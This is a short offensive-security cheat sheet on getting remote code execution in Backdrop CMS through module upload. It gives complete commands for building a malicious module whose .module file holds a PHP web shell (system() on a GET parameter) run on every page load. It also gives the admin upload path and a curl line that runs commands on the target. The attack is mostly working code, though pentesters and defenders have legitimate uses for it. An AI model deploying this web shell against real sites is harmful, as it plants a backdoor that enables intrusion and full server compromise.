# Backdrop CMS Module Upload RCE

Backdrop CMS admins can install modules by uploading a `.tar.gz` archive. A module only needs a `.info` file and a `.module` PHP file — the `.module` file runs as PHP when any module hook fires (e.g. hook_init on every page load).

**Requires:** Admin credentials.

```bash
# 1. Create malicious module:
mkdir webshell && cd webshell
cat > webshell.info << 'EOF'
name = WebShell
description = RCE module
backdrop = 1.x
type = module
EOF
cat > webshell.module << 'EOF'
<?php
function webshell_init() { system($_GET['cmd']); }
?>
EOF
tar czf webshell.tar.gz webshell/

# 2. Upload via admin:
# Navigate to: Admin → Functionality → Install new modules → Upload
# Or use the Installer endpoint: POST /admin/modules/install

# 3. Trigger via URL:
curl 'http://<TARGET>/?q=&cmd=id'
```

Backdrop stores installed modules in `modules/` webroot, so the `.module` file is directly web-accessible after installation.

Default admin URL: `http://<TARGET>/admin/modules/install`
